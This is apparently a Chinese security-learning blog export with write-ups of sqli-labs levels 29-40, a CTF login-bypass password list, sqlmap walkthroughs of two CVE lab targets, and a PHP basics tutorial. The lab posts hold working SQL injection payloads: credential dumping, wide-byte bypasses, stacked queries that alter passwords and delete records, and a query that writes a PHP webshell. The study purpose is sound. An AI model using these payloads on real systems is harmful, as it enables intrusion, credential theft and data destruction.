使用 php 万能密码尝试一下 归纳 # 万能密码表 # PHP 'or 1=1/* &quot;or “a”=&quot;a &quot;or 1=1– “or”=&quot; “or”=&quot;a’='a &quot;or1=1– “or=or” '‘or’=‘or’ ') or (‘a’='a ‘.).or.(’.a.’=’.a 'or 1=1 'or 1=1– 'or 1=1/* ‘or&quot;=&quot;a’='a ‘or’ ‘1’=‘1’ ‘or’’=’ ‘or’’=’‘or’’=’ ‘or’=‘1’ ‘or’=‘or’ 'or.‘a.’='a 'or1=1– 1’or’1’='1 a’or’ 1=1– a’or’1=1– or ‘a’=‘a’ or 1=1– or1=1– # asp aspx &quot;or “a”=&quot;a ‘.).or.(’.a.’=’.a or 1=1– 'or 1=1– a’or’ 1=1– &quot;or 1=1– 'or.‘a.’='a “or”=&quot;a’='a ‘or’’=’ or’=‘or’ jsp 1’or’1’='1 admin’ or 1=1/* 学习链接： https://blog.csdn.net/emdog/article/details/120878215?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2defaultOPENSEARCHRate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2defaultOPENSEARCHRate-1.pc_relevant_default&amp;utm_relevant_index=2 https://blog.csdn.net/emdog/article/details/120878215?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2defaultOPENSEARCHRate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2defaultOPENSEARCHRate-1.pc_relevant_default&amp;utm_relevant_index=2","categories":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/categories/buuctf/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/tags/buuctf/"}]},{"title":"sqli-labs-37-40","slug":"sqli-labs-37-40","date":"2023-03-26T12:46:20.000Z","updated":"2024-11-08T10:10:35.068Z","comments":true,"path":"2023/03/26/sqli-labs-37-40/","link":"","permalink":"https://dr4x3zz.github.io/2023/03/26/sqli-labs-37-40/","excerpt":"# sqli-labs-37-40","text":"# sqli-labs-37-40 # sqli-labs-37 使用 ' or '1'='1 发现单引号被注释 本关也是宽字节注入 用 bp 抓包 1uname=admin%df&#x27; union select 1,2#&amp;passwd=admin&amp;submit=Submit 具体 payload 就不一一列举了 # sqli-labs-38 本关虽然可以使用 union 但是题目告诉我们要使用堆叠注入 这里来学习一下堆叠注入 # 堆叠注入定义 Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。 # 堆叠注入原理 在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 # 堆叠注入的局限性 堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。 回归本题，我们可以通过堆叠注入更改原来数据库用户的密码、创建数据库等等 我们来更改一下 security 数据库中用户 Dumb 的密码 id=1 后成功登录 id=1’报错，闭合单引号 id=1’ --+ 开始更改 Dumb 的密码 1url?id=1&#x27;;update users set password=&#x27;12345&#x27; where username=&#x27;Dumb&#x27;;--+ 这里我使用 Navicat Premium 15 查看是否更改成功 更改成功 尝试新建数据库 1url?id=1&#x27;;create database Oblivion10;--+ 创建表 1url?id=1&#x27;;use Oblivion10;create table tongzheng(id int,user varchar(10));--+ 创建数据 1url?id=-1&#x27;;insert into oblivion10.tongzheng values(1,&#x27;test1&#x27;);--+ 用代码插入数据之后用 Navicat Premium 15 不管怎么改代码怎么尝试一直查看不到，问了学长告诉我 mysql 需要 use 一下数据库才可以用，我 use 了一下数据库之后点进去一看发现弹出了这么多数据，应该是几个代码都没有问题，只是查看不到应该 本关还可以用堆叠注入写入 webshell 1url?id=-1&#x27;;select &#x27;&lt;?php assert($_POST[less38]);?&gt;&#x27; into outfile &#x27;C:/phpstudy_pro/WWW/less38.php&#x27;-- s # sqli-labs-39 本关无闭合 也是堆叠注入，学习一下更改 38 关创建的数据库 oblivion10 的表 tongzheng 中 id 为 1 user 为 test1 的记录 1url?id=1;update oblivion10.tongzheng set user=&#x27;tzykx&#x27; where id=1 --+ 其他如果想新建数据库啊创建表啊添加数据啊可以参考 38 关的 payload 这里就不一一列举了 # sqli-labs-40 本关在尝试单引号闭合的时候发现没有报错，所以盲注 id=1’ 页面异常 id=1&quot; 页面正常 id=1’ --+ 异常 id=1’) --+ 正常 复习一下：如果字段本身是 int 类型，并且在查询语句中该字段的值被双引号或者单引号包裹，则只要值是以正确数字开头的，后面接多余的字符还是可以返回正确的查询结果，甚至单引号中可以包含双引号，双引号中可以包含单引号。 找到闭合为’） 此时开始堆叠注入 尝试删除数据库 oblivion10 中 tongzheng 中的 id=2 user 为 test1 的记录 1url?id=1&#x27;);delete from oblivion10.tongzheng where user=&#x27;test1&#x27; --+ 成功删除","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-33-36","slug":"sqli-labs-33-36","date":"2023-01-20T10:04:53.000Z","updated":"2024-11-08T10:10:27.989Z","comments":true,"path":"2023/01/20/sqli-labs-33-36/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/20/sqli-labs-33-36/","excerpt":"# sqli-labs-33-36","text":"# sqli-labs-33-36 # sqli-labs-33 addslashes () 函数 在每个双引号（&quot;）前添加反斜杠 addslashes () 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（&quot;） 反斜杠（\\） NULL 本关解法和 32 关是一样的也是宽字节注入 同样是单引号闭合 payload 就不一一列举了 # sqli-labs-34 本关变成 POST 型了，还是宽字节注入 不过在页面用 get 型的绕过是没有用的 bp 抓包 我们在输入框中输入的 % 也被 url 编码了 所以我们可以在 bp 中进行宽字节注入 闭合单引号 判断回显字段 爆库等一系列操作 1uname=admin%df&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata)#&amp;passwd=admin&amp;submit=Submit payload 就不一一列举了，在爆表爆列的时候要给数据库名称加上单引号可以把数据库名称转为 16 进制，直接带入语句中 # sqli-labs-35 本关没有闭合符号 123456789101112#判断字段数url?id=1 order by 4 --+ //三个#判断回显url?id=-1 union select 1,2,3 --+ //回显点为2，3#爆库url?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata --+#爆security表中的所有表名 由于table_schema=&#x27;security&#x27;单引号会被注释掉所以转为16进制url?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+#爆列url?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 --+#爆字段url?id=-1 union select 1,2,group_concat(concat(username,0x7e,password)) from users--+ # sqli-labs-36 单引号判断时会被转译，用宽字节注入 1url?id=1%df&#x27; --+ payload 如下： 123456789101112#判断字段数url?id=1%df&#x27; order by 4 --+#判断回显url?id=-1%df&#x27; union select 1,2,3 --+ //回显2，3#爆库url?id=-1%df&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+#爆security库中的所有表名url?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+#爆users表中的所有列名url?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 --+#爆出所有字段url?id=-1%df&#x27; union select 1,2,group_concat(concat(username,0x7e,password)) from users --+","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-29-32","slug":"sqli-labs-29-32","date":"2023-01-17T05:04:18.000Z","updated":"2024-11-08T10:10:21.534Z","comments":true,"path":"2023/01/17/sqli-labs-29-32/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/17/sqli-labs-29-32/","excerpt":"# sqli-labs-29-32","text":"# sqli-labs-29-32 # sqli-labs-29 http://(ip 地址)/sqli-labs-php7-master/Less-29/ 使用这个 url 时本关非常简单，无过滤有报错，和第一关第二关的难度一模一样，我就不能理解，看了一下竟然要访问 login.php… 本关竟然还需要自己发现困难，自己给自己创造困难。。。 再看代码的时候看到了一个 $_SERVER [‘QUERY_STRING’] 学习链接：详解 $_SERVER 函数中 QUERY_STRING 和 REQUEST_URI 区别 - 忘忧般若汤 - 博客园 (cnblogs.com) $_SERVER [“QUERY_STRING”] 获取查询 语句，实例中可知，获取的是？后面的值 具体可以查看一下上面的那个链接 学习链接：Sqli-Labs：Less 29 - Less 31 - 简书 (jianshu.com) MYSQL 注入天书之服务器（两层）架构 - lcamry - 博客园 (cnblogs.com) 29 实际上是两层服务器架构，一个是 Apache 另一个是 Tomcat 服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。 工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。 接下来是参数解析的问题。 问： index.php?id=1&amp;id=2 ，这时回显是 id=1 还是 id=2 呢？ ** 答：**apache (php) 解析最后一个参数，即回显 id=2 ；tomcat (jsp) 解析第 一个参数，即回显 id=1 。 这关给了个链接：https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf 内容是关于 HTTP 参数污染（HTTP Parameter Pollution，简称 HPP）的，正好前段时间简单看过，就是如果输入多个同名参数，可能服务器仅取第一个或者最后一个。用在 sql 注入的 WAF 绕过上，就是服务器所有同名参数都取了，但是对某些参数做检测，用其他参数做处理。 详情：(3 条消息) HTTP 参数污染攻击_0xdawn 的博客 - CSDN 博客_http 参数污染 ok 回归正题，先输入正确的 id 加个单引号 我们在 ID 后面输入 id=1&amp;id=2，网站到底会去执行哪个 ID 呢，这里需要看我们使用的 web 容器，如果我们使用的 web 容器为 apache，则会执行 id=2，如果为 tomcat，则会执行 id=1，这里我的 web 容器为 apache，所以会执行 id=2 1url?id=1&amp;id=2&#x27; 闭合单引号，联合注入获取回显字段 1url?id=1&amp;id=999&#x27; union select 1,2,3 --+ 爆库爆表等一系列操作，payload 就不一一列出了 # sqli-labs-30 1url?id=1&amp;id=2&quot;--+ 1url?id=1&amp;id=999&quot; union select 1,2,3 --+ 双引号闭合，其他和上一关一样 payload 就不一一列出了 # sqli-labs-31 1![屏幕截图_20230118_164355](E:/Screenshots/屏幕截图_20230118_164355.png)url/login.php?id=1&amp;id=2&quot; 闭合如图双引号括号闭合 1url?id=1&amp;id=999&quot;) union select 1,2,3 --+ 2，3 为回显字段 payload 就不一一列出了 本关和前两关也是一样的 # sqli-labs-32 # preg_quote () 函数 preg_last_error 函数用于转义正则表达式字符。 语法 1string preg_quote ( string $str [, string $delimiter = NULL ] ) preg_quote () 需要参数 str 并向其中 每个正则表达式语法中的字符前增加一个反斜线。 这通常用于你有一些运行时字符串 需要作为正则表达式进行匹配的时候。 正则表达式特殊字符有： . \\ + * ? [^] $ ( ) { } = ! &lt; &gt; | : - 参数说明： $str: 输入字符串。 $delimiter: 如果指定了可选参数 delimiter，它也会被转义。这通常用于 转义 PCRE 函数使用的分隔符。 / 是最通用的分隔符。 # 宽字节注入 宽字节注入是利用 mysql 的一个特性，mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字（前一个 ASCII 码要大于 128，才到汉字的范围），示例如下图： PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为 “\\”），MYSQL 默认字符集是 GBK 等宽字节字符集。如上图所示 % df’被 PHP 转义，单引号被加上反斜杠 \\，变成了 % d’，其中 \\ 的十六进制是 %5C，那么现在 % d’=% d%5C%27, 如果程序的默认字符集是 GBK 等宽字节字符集，则 MYSQL 用 GBK 编码时，会认为 % df%5C 是一个宽字符，也就是縗，也就是说：% df\\’ = % df%5c%27 = 縗’，有了单引号就可以注入了。 宽字节 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃 ASCII 字符 (一字节) 的现象，即将两个 ascii 字符误认为是一个宽字节字符。 学习链接：(3 条消息) 宽字节注入_stars77 的博客 - CSDN 博客_post 宽字节注入 # set names gbk： 可以再在建数据库的时候设置，也可以在创建表的时候设置，或只是对部分字段进行设置，而且在设置编码的时候，这些地方最好是一致的，这样能最大程度上避免数据记录出现乱码 在这个语句中的意思是 对 $con1 进行 set names gbk 编码 然后 gbk 是两个字节作为一个汉字，而 uft-8 是三个字节作为一个汉字，例如 % aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围，两个字节才能形成文字） 我们使用 ascii 码大于 128 的有一个 % aa 和 % df 输入正确的 id 添加单引号 单引号前多了一个 \\ 把单引号转译了 宽字节注入 1url?id=1&#x27;%df&#x27; 单引号闭合 注释掉后面的单引号，order by 判断字段数 union select 1,2,3 判断回显字段 12345url?id=1&#x27;%df&#x27; order by 1 --+url?id=1&#x27;%df&#x27; order by 2 --+url?id=1&#x27;%df&#x27; order by 3 --+url?id=1&#x27;%df&#x27; order by 4 --+ //报错url?id=999&#x27;%df&#x27; union select 1,2,3 --+ payload 中只有闭合单引号时用宽字节注入，其他涉及单引号的部分都要用字符的十六进制编码，否则会报错。 在我爆表时使用 ?id=999'%df' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security') --+ 页面报错 因为 mysql 支持十六进制的数值，所以我们这里直接将数据转为 16 进制即可（0x 表示 16 进制） security 转十六进制为 0x7365637572697479，不带上单引号 12345678//爆库url?id=999&#x27;%df&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata) --+//爆表url?id=999&#x27;%df&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479) --+//爆列url?id=999&#x27;%df&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273) --+//爆字段url?id=999&#x27;%df&#x27; union select 1,2,(select group_concat(username,0x5e,password) from users) --+ //0x5e是^","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"【春秋云境】CVE-2022-28512学习记录","slug":"【春秋云境】CVE-2022-28512学习记录","date":"2023-01-16T06:07:14.000Z","updated":"2024-11-08T09:56:21.671Z","comments":true,"path":"2023/01/16/【春秋云境】CVE-2022-28512学习记录/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/16/%E3%80%90%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%E3%80%91CVE-2022-28512%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"# CVE-2022-28512","text":"# CVE-2022-28512 # 靶场介绍 Fantastic Blog (CMS) 是一个绝对出色的博客 / 文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该 CMS 的 /single.php 路径下，id 参数存在一个 SQL 注入漏洞。 # 开启靶场 # bp 抓包，找到注入点 根据提示构造 url，访问 /single.php?id=1 并使用 bp 抓包，并记录下需要的参数。 1--user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot; 1--cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1673790473,1673845827; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1673848845; BLOG_ADMIN=tk6nouloa53egfoepk71hnra70&quot; # sqlmap # 爆库 1python sqlmap.py -u &quot;eci-2zeh8obpmkycw8lavc73.cloudeci1.ichunqiu.com/single.php?id=1&quot; -p &quot;id&quot; --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1673790473,1673845827; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1673848845; BLOG_ADMIN=tk6nouloa53egfoepk71hnra70&quot; --batch --dbs 得到所有数据库： # 爆表 1python sqlmap.py -u &quot;eci-2zeh8obpmkycw8lavc73.cloudeci1.ichunqiu.com/single.php?id=1&quot; -p &quot;id&quot; --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1673790473,1673845827; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1673848845; BLOG_ADMIN=tk6nouloa53egfoepk71hnra70&quot; --batch -D &quot;ctf&quot; --tables 获得 ctf 数据库中所有表名： # 爆列 1python sqlmap.py -u &quot;eci-2zeh8obpmkycw8lavc73.cloudeci1.ichunqiu.com/single.php?id=1&quot; -p &quot;id&quot; --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1673790473,1673845827; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1673848845; BLOG_ADMIN=tk6nouloa53egfoepk71hnra70&quot; --batch -D &quot;ctf&quot; -T &quot;flag&quot; --columns 获得 flag 表中所有列： # 爆字段 1python sqlmap.py -u &quot;eci-2zeh8obpmkycw8lavc73.cloudeci1.ichunqiu.com/single.php?id=1&quot; -p &quot;id&quot; --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1673790473,1673845827; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1673848845; BLOG_ADMIN=tk6nouloa53egfoepk71hnra70&quot; --batch -D &quot;ctf&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump 获得 flag：","categories":[{"name":"春秋云境","slug":"春秋云境","permalink":"https://dr4x3zz.github.io/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"}],"tags":[{"name":"春秋云境","slug":"春秋云境","permalink":"https://dr4x3zz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"}]},{"title":"【春秋云境】CVE-2022-32991学习记录","slug":"【春秋云境】CVE-2022-32991学习记录","date":"2023-01-16T05:32:26.000Z","updated":"2024-11-08T09:57:07.407Z","comments":true,"path":"2023/01/16/【春秋云境】CVE-2022-32991学习记录/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/16/%E3%80%90%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%E3%80%91CVE-2022-32991%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"# CVE-2022-32991","text":"# CVE-2022-32991 # 靶场介绍 Web Based Quiz System v1.0 was discovered to contain a SQL injection vulnerability via the eid parameter at welcome.php. 基于 Web 的测验系统 v1.0 被发现包含 SQL 注入漏洞，通过 welcome.php 的 eid 参数。 # 开启靶场 # 注册 &amp; 登录 REGISTER→任意注册一个 # 查找目标 从介绍可以知道注入点在 welcome.php 的 eid 参数 很显然不在这个页面中，点击 start 这个界面有 eid 的参数 # bp 抓包 记录 Sqlmap 攻击所需的 HTTP 头部请求参数 1--cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1673790473,1673845827; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1673846975; PHPSESSID=l4joqtj6rhi335oi2muvfq4pv3&quot; 1--user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot; 其中–user-agent 可采用–random-agent 技术说明：由于该页面采用了登录访问，所以首先想到要使用–cookie 参数使得 sqlmap 绕过身份验证，并添加–user-agent 参数或–random-agent 使得 sqlmap 绕过客户端验证，否则可能会被识别到明显的 sqlmap 客户端标识，从而导致攻击的中断。 # sqlmap 攻击 # 爆库 1python sqlmap.py -u &quot;http://eci-2zee4d6gwx927nbc59x0.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1673790473,1673845827; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1673846975; PHPSESSID=l4joqtj6rhi335oi2muvfq4pv3&quot; --batch --dbs 得到数据库 # 爆表 1python sqlmap.py -u &quot;http://eci-2zee4d6gwx927nbc59x0.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1673790473,1673845827; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1673846975; PHPSESSID=l4joqtj6rhi335oi2muvfq4pv3&quot; --batch -D &quot;ctf&quot; --tables 得到 ctf 数据库中所有表名： # 爆列 得到 flag 表中的所有列： # 爆字段 1python sqlmap.py -u &quot;http://eci-2zee4d6gwx927nbc59x0.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1673790473,1673845827; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1673846975; PHPSESSID=l4joqtj6rhi335oi2muvfq4pv3&quot; --batch -D &quot;ctf&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump 得到 flag： 1flag&#123;dc01624e-2536-41eb-b861-3b6b9198eeda&#125; # 总结 题目 CVE-2022-32991 主要考察攻击者对于 sqlmap 参数的熟练运用，第一时间知道用到哪些参数 –cookie #绕过身份验证 –random-agent 或–user-agent #绕过客户端验证 –batch #默认后续 sqlmap 操作都为 Y –p #指定 sqlmap 注入的传参参数 学习链接：https://blog.csdn.net/MONSTERinCAT/article/details/127261129","categories":[{"name":"春秋云境","slug":"春秋云境","permalink":"https://dr4x3zz.github.io/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"}],"tags":[{"name":"春秋云境","slug":"春秋云境","permalink":"https://dr4x3zz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"}]},{"title":"php学习2023-01-15","slug":"php学习2023-01-15","date":"2023-01-15T13:11:49.000Z","updated":"2024-11-08T10:08:40.278Z","comments":true,"path":"2023/01/15/php学习2023-01-15/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/15/php%E5%AD%A6%E4%B9%A02023-01-15/","excerpt":"# php 学习 (函数、魔术常量)","text":"# php 学习 (函数、魔术常量) # 函数 # 创建 PHP 函数 语法： 123456&lt;?php function functionName() &#123; // 要执行的代码 &#125;?&gt; PHP 函数准则： 函数的名称应该提示出它的功能 函数名称以字母或下划线开头（不能以数字开头） 示例： 12345678&lt;?php function writeName() &#123; echo &quot;php学习&quot;; &#125; echo &quot;I like &quot;; writeName();?&gt; 输出： I like php 学习 # PHP 函数 - 添加参数 为了给函数添加更多的功能，我们可以添加参数，参数类似变量。 参数就在函数名称后面的一个括号内指定。 示例： 12345678910111213&lt;?phpfunction writeName($fname)&#123; echo $fname . &quot; Refsnes.&lt;br&gt;&quot;;&#125; echo &quot;My name is &quot;;writeName(&quot;Kai Jim&quot;);echo &quot;My sister&#x27;s name is &quot;;writeName(&quot;Hege&quot;);echo &quot;My brother&#x27;s name is &quot;;writeName(&quot;Stale&quot;);?&gt; 输出： My name is Kai Jim Refsnes. My sister’s name is Hege Refsnes. My brother’s name is Stale Refsnes. 12345678910111213&lt;?phpfunction writeName($fname,$punctuation)&#123; echo $fname . &quot; Refsnes&quot; . $punctuation . &quot;&lt;br&gt;&quot;;&#125; echo &quot;My name is &quot;;writeName(&quot;Kai Jim&quot;,&quot;.&quot;);echo &quot;My sister&#x27;s name is &quot;;writeName(&quot;Hege&quot;,&quot;!&quot;);echo &quot;My brother&#x27;s name is &quot;;writeName(&quot;Ståle&quot;,&quot;?&quot;);?&gt; 输出： My name is Kai Jim Refsnes. My sister’s name is Hege Refsnes! My brother’s name is Ståle Refsnes? # PHP 函数 - 返回值 123456789&lt;?phpfunction add($x,$y)&#123; $total=$x+$y; return $total;&#125; echo &quot;1 + 16 = &quot; . add(1,16);?&gt; 输出： 1 + 16 = 17 # 魔术常量 PHP 向它运行的任何脚本提供了大量的预定义常量。 不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。 有八个魔术常量它们的值随着它们在代码中的位置改变而改变。 # __LINE__ 文件中的当前行号。 123&lt;?php echo &quot;这是第&quot; . __LINE__ . &quot;行。&quot;；?&gt; 输出： 这是第 2 行。 # __FILE__ 文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。 123&lt;?php echo &quot;该文件位于“ &quot; . __FILE__ . &quot; ”&quot;；?&gt; 输出： 该文件位于 “ D:\\phpstudy\\WWW\\phplearning\\phplearning 相关语法练习_FILE_.php ” # __DIR__ 文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。 123&lt;?php echo &quot;该文件位于“ &quot; . __DIR__ . &quot; ”&quot;；?&gt; 输出： 该文件位于 “D:\\phpstudy\\WWW\\phplearning\\phplearning 相关语法练习” # __FUNCTION__ 函数名称。 1234567&lt;?php function test() &#123; echo &quot;函数名为&quot; . __FUNCTION__; &#125; test();?&gt; 输出： 函数名为 test # __CLASS__ 类的定义与创建 类是具有相同属性和服务的一组对象的集合。它为属于该类的所有对象提供了统一的抽象描述，其内部包括属性和方法两个主要部分。在面向对象的编程语言中，类是一个独立的程序单位，它应该有一个类名并包括属性说明和方法说明两个主要部分。 相当于 c 语言中的结构体吧 将类实例化成对象非常容易，只需要使 new 关键字并在后面加上一个和类名同名的方法即可。当然如果在实例化对象时不需要为对象传递参数，在 new 关键字后面直接用类名称即可，不需要再加上括号。 对象的实例化格式如下： 变量名 = new 类名 (参数数列表); 或 变量名 = new 类名； 123456789101112&lt;?php class test &#123; function _print() &#123; echo &#x27;类名为&#x27; . __CLASS__ . &#x27;&lt;br&gt;&#x27;; echo &quot;函数名为&quot; . __FUNCTION__; &#125; &#125; $t = new test(); $t -&gt; _print();?&gt; 输出： 类名为 test 函数名为_print # __TRAIT__ Trait 名包括其被声明的作用区域（例如 Foo\\Bar）。 # parent:: 从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖。其行为 MyHelloWorld 类中定义的方法一致。优先顺序是当前类中的方法会覆盖 trait 方法，而 trait 方法又覆盖了基类中的方法。 在 PHP 中不能定义重名的函数，也包括不能再同一个类中定义重名的方法，所以也就没有方法重载。单在子类中可以定义和父类重名的方法，因为父类的方法已经在子类中存在，这样在子类中就可以把从父类中继承过来的方法重写。 子类中重载父类的方法就是在子类中覆盖从父类中继承过来的方法，父类中的方法被子类继承过来不就可以直接使用吗？为什么还要重载呢？因为有一些情况我们必须要覆盖的。例如，有一个 “鸟” 类，在这个类中定义了鸟的通用方法 “飞翔”。将 “鸵鸟” 类作为它的子类，就会将 “飞翔” 的方法继承过来，但只要一调用 “鸵鸟” 类中的这个 “飞翔” 的方法，鸵鸟就会飞走。虽然鸵鸟是不会飞的，但其他特性都具有 “鸟类” 的特性，所以在声明 “鸵鸟” 类时还是可以继承 “鸟” 类的，但必须在 “鸵鸟” 类中将 “鸟” 类中继承过来的 “飞翔” 方法改写，就需要在子类中重载父类中的方法。 例子： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass Person&#123;protected $name;protected $sex;protected $Wage;function construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=1)&#123;$this -&gt;name = $name;$this -&gt;sex = $sex;$this -&gt;age = $age;&#125;//在人类中声明一个通用的说话方法，介绍一下自己function say()&#123;echo &quot;我的名字：&quot;.$this-&gt; name.&quot;，性别：&quot;.$this -&gt;sex.&quot;，年龄：&quot;.$this 